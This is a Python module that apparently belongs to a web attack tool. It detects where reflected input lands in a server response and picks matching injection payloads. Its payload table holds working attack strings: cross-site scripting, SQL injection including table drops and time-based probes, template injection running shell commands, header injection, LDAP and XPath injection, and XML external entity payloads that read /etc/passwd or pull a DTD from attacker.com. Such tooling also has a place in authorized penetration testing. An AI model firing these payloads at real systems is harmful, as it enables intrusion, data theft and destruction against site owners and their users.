"""
payload_context_detector.py — Context-Aware Payload Selection
=============================================================
Detects the injection context BEFORE launching an attack.
Payload must adapt automatically to avoid broken exploits.

Supported contexts:
- HTML body
- HTML attribute (quoted/unquoted)
- JavaScript string/code
- JSON value
- URL parameter
- SQL query
- Template engine (Jinja2, Twig, Mako, Pug, EL, Velocity)
- HTTP headers
- GraphQL / XML
- CSS value
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple


# ─────────────────────────────────────────────
# Context types
# ─────────────────────────────────────────────
class InjectionContext(str, Enum):
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE_DOUBLE = "html_attribute_double"   # value="HERE"
    HTML_ATTRIBUTE_SINGLE = "html_attribute_single"   # value='HERE'
    HTML_ATTRIBUTE_UNQUOTED = "html_attribute_unquoted"  # value=HERE
    HTML_COMMENT = "html_comment"                      # <!-- HERE -->
    JAVASCRIPT_STRING_DOUBLE = "js_string_double"      # "HERE"
    JAVASCRIPT_STRING_SINGLE = "js_string_single"      # 'HERE'
    JAVASCRIPT_TEMPLATE = "js_template"                # `HERE`
    JAVASCRIPT_CODE = "js_code"                        # direct code context
    JSON_VALUE = "json_value"
    JSON_KEY = "json_key"
    URL_PARAM = "url_param"
    URL_PATH = "url_path"
    SQL_STRING_SINGLE = "sql_string_single"            # WHERE x='HERE'
    SQL_STRING_DOUBLE = "sql_string_double"            # WHERE x="HERE"
    SQL_NUMERIC = "sql_numeric"                        # WHERE id=HERE
    TEMPLATE_JINJA2 = "template_jinja2"
    TEMPLATE_TWIG = "template_twig"
    TEMPLATE_MAKO = "template_mako"
    TEMPLATE_PUG = "template_pug"
    TEMPLATE_EL = "template_el"                        # ${} EL expression
    TEMPLATE_VELOCITY = "template_velocity"
    HEADER_VALUE = "header_value"
    GRAPHQL = "graphql"
    XML = "xml"
    CSS_VALUE = "css_value"
    LDAP = "ldap"
    XPATH = "xpath"
    UNKNOWN = "unknown"


@dataclass
class ContextDetectionResult:
    """Result of injection context detection."""
    context: InjectionContext
    confidence: float
    evidence: str = ""
    surrounding_context: str = ""
    escape_chars: List[str] = field(default_factory=list)
    recommended_payloads: List[str] = field(default_factory=list)
    is_executable: bool = False

    def to_dict(self):
        return {
            "context": self.context.value,
            "confidence": self.confidence,
            "evidence": self.evidence,
            "escape_chars": self.escape_chars,
            "is_executable": self.is_executable,
        }


# ─────────────────────────────────────────────
# Context detection patterns
# ─────────────────────────────────────────────
class _Patterns:
    # HTML context indicators
    HTML_TAG = re.compile(r"<[^>]{0,200}INJECT[^>]{0,200}>", re.I | re.S)
    HTML_ATTR_DQ = re.compile(r'=\s*"[^"]{0,200}INJECT[^"]{0,200}"', re.I)
    HTML_ATTR_SQ = re.compile(r"=\s*'[^']{0,200}INJECT[^']{0,200}'", re.I)
    HTML_ATTR_UQ = re.compile(r"=\s*INJECT\s*(?:[>\s])", re.I)
    HTML_COMMENT = re.compile(r"<!--[^-]{0,500}INJECT[^-]{0,500}-->", re.I | re.S)

    # JavaScript context indicators
    JS_STR_DQ = re.compile(r'"[^"\\]{0,200}INJECT[^"\\]{0,200}"')
    JS_STR_SQ = re.compile(r"'[^'\\]{0,200}INJECT[^'\\]{0,200}'")
    JS_TEMPLATE = re.compile(r"`[^`]{0,500}INJECT[^`]{0,500}`", re.S)
    JS_CODE_VAR = re.compile(r"(?:var|let|const)\s+\w+\s*=\s*INJECT", re.I)
    JS_FUNC = re.compile(r"\w+\((?:[^)]*,\s*)?INJECT(?:\s*,|[^)]*)\)", re.I)

    # JSON indicators
    JSON_VALUE = re.compile(r'"[^"]*":\s*"[^"]*INJECT[^"]*"', re.I)
    JSON_KEY = re.compile(r'"[^"]*INJECT[^"]*"\s*:', re.I)

    # SQL indicators
    SQL_STR_SQ = re.compile(r"'[^']{0,200}INJECT[^']{0,200}'")
    SQL_STR_DQ = re.compile(r'"[^"]{0,200}INJECT[^"]{0,200}"')
    SQL_NUMERIC = re.compile(r"(?:WHERE|AND|OR|HAVING)\s+\w+\s*[=<>!]+\s*INJECT", re.I)
    SQL_KEYWORDS = re.compile(r"\b(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|UNION|JOIN)\b", re.I)

    # Template indicators
    JINJA2 = re.compile(r"(?:\{\{[^}]*INJECT|INJECT[^}]*\}\}|{% .*INJECT.*%})", re.I)
    TWIG = re.compile(r"(?:\{\{[^}]*INJECT|\{%[^%]*INJECT)", re.I)
    MAKO = re.compile(r"(?:\$\{[^}]*INJECT|<%[^%]*INJECT)", re.I)
    EL = re.compile(r"\$\{[^}]*INJECT[^}]*\}", re.I)
    VELOCITY = re.compile(r"#(?:set|if|foreach|parse)\s*\([^)]*INJECT[^)]*\)", re.I)
    PUG = re.compile(r"!{[^}]*INJECT[^}]*}", re.I)

    # URL
    URL_PARAM = re.compile(r"[?&]\w+=[^&]*INJECT")
    URL_PATH = re.compile(r"/[^?#]*INJECT[^?#]*/")

    # Header
    HEADER = re.compile(r"^[A-Za-z-]+:\s*.*INJECT.*$", re.M)

    # GraphQL
    GRAPHQL = re.compile(r"(?:query|mutation|subscription)\s*\{[^}]*INJECT[^}]*\}", re.I | re.S)

    # XML/LDAP/XPath
    XML = re.compile(r"<\w+[^>]*INJECT[^>]*>|<!\[CDATA\[.*INJECT.*\]\]>", re.I | re.S)
    LDAP = re.compile(r"\([^()]*INJECT[^()]*\)", re.I)
    XPATH = re.compile(r"/[^/]*INJECT[^/]*/|@\w+='[^']*INJECT[^']*'", re.I)

    # CSS
    CSS = re.compile(r"(?:url\(|content\s*:\s*)['\"]?[^'\")\s]*INJECT", re.I)


# ─────────────────────────────────────────────
# Payload templates per context
# ─────────────────────────────────────────────
_CONTEXT_PAYLOADS: Dict[InjectionContext, List[str]] = {
    InjectionContext.HTML_BODY: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
    ],
    InjectionContext.HTML_ATTRIBUTE_DOUBLE: [
        '" onmouseover="alert(1)"',
        '" onerror="alert(1)" src="x',
        '"><script>alert(1)</script>',
        '" autofocus onfocus="alert(1)"',
    ],
    InjectionContext.HTML_ATTRIBUTE_SINGLE: [
        "' onmouseover='alert(1)'",
        "' onerror='alert(1)' src='x",
        "'><script>alert(1)</script>",
        "' autofocus onfocus='alert(1)'",
    ],
    InjectionContext.HTML_ATTRIBUTE_UNQUOTED: [
        " onmouseover=alert(1)",
        " onerror=alert(1) src=x",
    ],
    InjectionContext.JAVASCRIPT_STRING_DOUBLE: [
        '";alert(1)//',
        '";alert(1);"',
        '\\";alert(1)//',
        '"+(alert(1))+"',
    ],
    InjectionContext.JAVASCRIPT_STRING_SINGLE: [
        "';alert(1)//",
        "';alert(1);'",
        "\\';alert(1)//",
        "'+(alert(1))+'",
    ],
    InjectionContext.JAVASCRIPT_TEMPLATE: [
        "${alert(1)}",
        "`+alert(1)+`",
        "${`alert`(1)}",
    ],
    InjectionContext.JAVASCRIPT_CODE: [
        "alert(1)",
        "eval('alert(1)')",
        "(new Function('alert(1)'))()",
    ],
    InjectionContext.JSON_VALUE: [
        '","malicious":"injected',
        '\\",\\"admin\\":true,\\"x\\":\\"',
        "<script>alert(1)</script>",
    ],
    InjectionContext.URL_PARAM: [
        "javascript:alert(1)",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "' OR '1'='1",
    ],
    InjectionContext.SQL_STRING_SINGLE: [
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DROP TABLE users--",
        "' UNION SELECT 1,2,3--",
        "' AND 1=1--",
        "' AND SLEEP(5)--",
    ],
    InjectionContext.SQL_STRING_DOUBLE: [
        '" OR "1"="1',
        '" OR 1=1--',
        '" UNION SELECT 1,2,3--',
    ],
    InjectionContext.SQL_NUMERIC: [
        "1 OR 1=1",
        "1 UNION SELECT 1,2,3--",
        "1; DROP TABLE users--",
        "1 AND SLEEP(5)--",
    ],
    InjectionContext.TEMPLATE_JINJA2: [
        "{{7*7}}",
        "{{config.items()}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{%for c in [].__class__.__base__.__subclasses__()%}{{c}}{%endfor%}",
    ],
    InjectionContext.TEMPLATE_TWIG: [
        "{{7*7}}",
        "{{_self.env.displayVar('id')}}",
        "{{['id']|filter('system')}}",
    ],
    InjectionContext.TEMPLATE_EL: [
        "${7*7}",
        "${Runtime.getRuntime().exec('id')}",
        "${applicationScope}",
    ],
    InjectionContext.TEMPLATE_MAKO: [
        "${7*7}",
        "<%import os%>${os.system('id')}",
        "${self.module.__builtins__}",
    ],
    InjectionContext.HEADER_VALUE: [
        "\r\nX-Injected: header",
        "\nSet-Cookie: malicious=true",
        "%0d%0aX-Injected: header",
    ],
    InjectionContext.GRAPHQL: [
        '__schema{types{name}}',
        '{ __typename }',
        '}{malicious:__typename}',
    ],
    InjectionContext.XML: [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>',
    ],
    InjectionContext.LDAP: [
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin)(|(password=*",
    ],
    InjectionContext.XPATH: [
        "' or '1'='1",
        "' or 1=1 or 'x'='x",
        "] | //user[name='admin",
    ],
    InjectionContext.CSS_VALUE: [
        "expression(alert(1))",
        "url(javascript:alert(1))",
        "-moz-binding:url(data:text/xml,<bindings/>)",
    ],
}


# ─────────────────────────────────────────────
# Context Detector
# ─────────────────────────────────────────────
class PayloadContextDetector:
    """
    Detects the injection context in a response body by substituting
    a unique marker ("INJECT") and analyzing surrounding HTML/JS/SQL structure.

    Usage:
        detector = PayloadContextDetector()
        results = detector.detect(response_body, marker="INJECT_HERE")
        for ctx_result in results:
            payloads = ctx_result.recommended_payloads
    """

    MARKER = "INJECT"

    def detect(
        self,
        response_body: str,
        reflected_value: Optional[str] = None,
    ) -> List[ContextDetectionResult]:
        """
        Analyze response body to determine injection context(s).

        If reflected_value is provided, replaces it with INJECT marker first.
        Returns all detected contexts, ordered by confidence.
        """
        if not response_body:
            return [ContextDetectionResult(
                context=InjectionContext.UNKNOWN,
                confidence=0.0,
                evidence="Empty response",
            )]

        body = response_body
        if reflected_value:
            body = body.replace(reflected_value, self.MARKER)

        results: List[ContextDetectionResult] = []
        results.extend(self._detect_html_context(body))
        results.extend(self._detect_js_context(body))
        results.extend(self._detect_sql_context(body))
        results.extend(self._detect_template_context(body))
        results.extend(self._detect_special_contexts(body))

        if not results:
            results.append(ContextDetectionResult(
                context=InjectionContext.UNKNOWN,
                confidence=0.1,
                evidence="No context pattern matched",
            ))

        # Sort by confidence descending
        results.sort(key=lambda r: r.confidence, reverse=True)

        # Attach recommended payloads
        for r in results:
            r.recommended_payloads = _CONTEXT_PAYLOADS.get(r.context, [])

        return results

    def detect_primary(
        self,
        response_body: str,
        reflected_value: Optional[str] = None,
    ) -> ContextDetectionResult:
        """Return only the highest-confidence detected context."""
        results = self.detect(response_body, reflected_value)
        return results[0]

    def get_payloads_for(self, context: InjectionContext) -> List[str]:
        """Get recommended payloads for a known context."""
        return _CONTEXT_PAYLOADS.get(context, [])

    # ── Private detectors ────────────────────────────────────────
    def _detect_html_context(self, body: str) -> List[ContextDetectionResult]:
        results = []
        p = _Patterns

        # HTML body (tag content)
        m = p.HTML_TAG.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.HTML_BODY,
                confidence=0.7,
                evidence=m.group(0)[:80],
                escape_chars=["<", ">", "&"],
                is_executable=True,
            ))

        # HTML attribute (double quoted)
        m = p.HTML_ATTR_DQ.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.HTML_ATTRIBUTE_DOUBLE,
                confidence=0.85,
                evidence=m.group(0)[:80],
                escape_chars=['"', ">"],
                is_executable=True,
            ))

        # HTML attribute (single quoted)
        m = p.HTML_ATTR_SQ.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.HTML_ATTRIBUTE_SINGLE,
                confidence=0.85,
                evidence=m.group(0)[:80],
                escape_chars=["'", ">"],
                is_executable=True,
            ))

        # HTML attribute (unquoted)
        m = p.HTML_ATTR_UQ.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.HTML_ATTRIBUTE_UNQUOTED,
                confidence=0.75,
                evidence=m.group(0)[:80],
                escape_chars=[" ", ">"],
                is_executable=True,
            ))

        # HTML comment
        m = p.HTML_COMMENT.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.HTML_COMMENT,
                confidence=0.6,
                evidence=m.group(0)[:80],
                escape_chars=["-->"],
                is_executable=False,
            ))

        return results

    def _detect_js_context(self, body: str) -> List[ContextDetectionResult]:
        results = []
        p = _Patterns

        m = p.JS_STR_DQ.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.JAVASCRIPT_STRING_DOUBLE,
                confidence=0.88,
                evidence=m.group(0)[:80],
                escape_chars=['"', "\\"],
                is_executable=True,
            ))

        m = p.JS_STR_SQ.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.JAVASCRIPT_STRING_SINGLE,
                confidence=0.88,
                evidence=m.group(0)[:80],
                escape_chars=["'", "\\"],
                is_executable=True,
            ))

        m = p.JS_TEMPLATE.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.JAVASCRIPT_TEMPLATE,
                confidence=0.82,
                evidence=m.group(0)[:80],
                escape_chars=["`", "${"],
                is_executable=True,
            ))

        m = p.JS_CODE_VAR.search(body) or p.JS_FUNC.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.JAVASCRIPT_CODE,
                confidence=0.78,
                evidence=m.group(0)[:80],
                escape_chars=[";", "//"],
                is_executable=True,
            ))

        # JSON detection
        m = p.JSON_VALUE.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.JSON_VALUE,
                confidence=0.8,
                evidence=m.group(0)[:80],
                escape_chars=['"', "\\"],
                is_executable=False,
            ))

        return results

    def _detect_sql_context(self, body: str) -> List[ContextDetectionResult]:
        results = []
        # SQL errors in response body suggest SQL context
        sql_error_patterns = [
            (re.compile(r"you have an error in your sql", re.I), 0.95, "MySQL error"),
            (re.compile(r"ORA-\d{5}", re.I), 0.95, "Oracle error"),
            (re.compile(r"pg_query\(\)|PostgreSQL.*ERROR", re.I), 0.9, "PostgreSQL error"),
            (re.compile(r"sqlite3\.OperationalError", re.I), 0.9, "SQLite error"),
            (re.compile(r"SqlException|System\.Data\.SqlClient", re.I), 0.9, "MSSQL error"),
            (re.compile(r"unclosed quotation mark|syntax error.*near", re.I), 0.85, "SQL syntax error"),
        ]
        for pat, conf, evidence in sql_error_patterns:
            m = pat.search(body)
            if m:
                # Can't tell exactly which context — detect from surrounding
                results.append(ContextDetectionResult(
                    context=InjectionContext.SQL_STRING_SINGLE,  # Most common
                    confidence=conf,
                    evidence=evidence + ": " + m.group(0)[:60],
                    escape_chars=["'"],
                    is_executable=True,
                ))

        return results

    def _detect_template_context(self, body: str) -> List[ContextDetectionResult]:
        results = []
        p = _Patterns
        template_checks = [
            (p.JINJA2, InjectionContext.TEMPLATE_JINJA2, 0.85),
            (p.TWIG, InjectionContext.TEMPLATE_TWIG, 0.82),
            (p.MAKO, InjectionContext.TEMPLATE_MAKO, 0.80),
            (p.EL, InjectionContext.TEMPLATE_EL, 0.82),
            (p.VELOCITY, InjectionContext.TEMPLATE_VELOCITY, 0.78),
            (p.PUG, InjectionContext.TEMPLATE_PUG, 0.75),
        ]
        for pat, ctx, conf in template_checks:
            m = pat.search(body)
            if m:
                results.append(ContextDetectionResult(
                    context=ctx,
                    confidence=conf,
                    evidence=m.group(0)[:80],
                    is_executable=True,
                ))
        return results

    def _detect_special_contexts(self, body: str) -> List[ContextDetectionResult]:
        results = []
        p = _Patterns

        # Header injection
        m = p.HEADER.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.HEADER_VALUE,
                confidence=0.7,
                evidence=m.group(0)[:80],
                escape_chars=["\r\n"],
            ))

        # GraphQL
        m = p.GRAPHQL.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.GRAPHQL,
                confidence=0.75,
                evidence=m.group(0)[:80],
                is_executable=True,
            ))

        # XML/XXE
        m = p.XML.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.XML,
                confidence=0.72,
                evidence=m.group(0)[:80],
                is_executable=True,
            ))

        # LDAP
        m = p.LDAP.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.LDAP,
                confidence=0.65,
                evidence=m.group(0)[:80],
            ))

        # CSS
        m = p.CSS.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.CSS_VALUE,
                confidence=0.6,
                evidence=m.group(0)[:80],
                is_executable=True,
            ))

        # URL path
        m = p.URL_PATH.search(body)
        if m:
            results.append(ContextDetectionResult(
                context=InjectionContext.URL_PATH,
                confidence=0.55,
                evidence=m.group(0)[:80],
            ))

        return results


# ─────────────────────────────────────────────
# Quick API
# ─────────────────────────────────────────────
_detector = PayloadContextDetector()


def detect_context(response_body: str, reflected_value: Optional[str] = None) -> ContextDetectionResult:
    """Quick single-context detection (highest confidence)."""
    return _detector.detect_primary(response_body, reflected_value)


def detect_all_contexts(response_body: str, reflected_value: Optional[str] = None) -> List[ContextDetectionResult]:
    """Detect all injection contexts in the response."""
    return _detector.detect(response_body, reflected_value)


def payloads_for_context(context: InjectionContext) -> List[str]:
    """Get recommended payloads for a context."""
    return _CONTEXT_PAYLOADS.get(context, [])
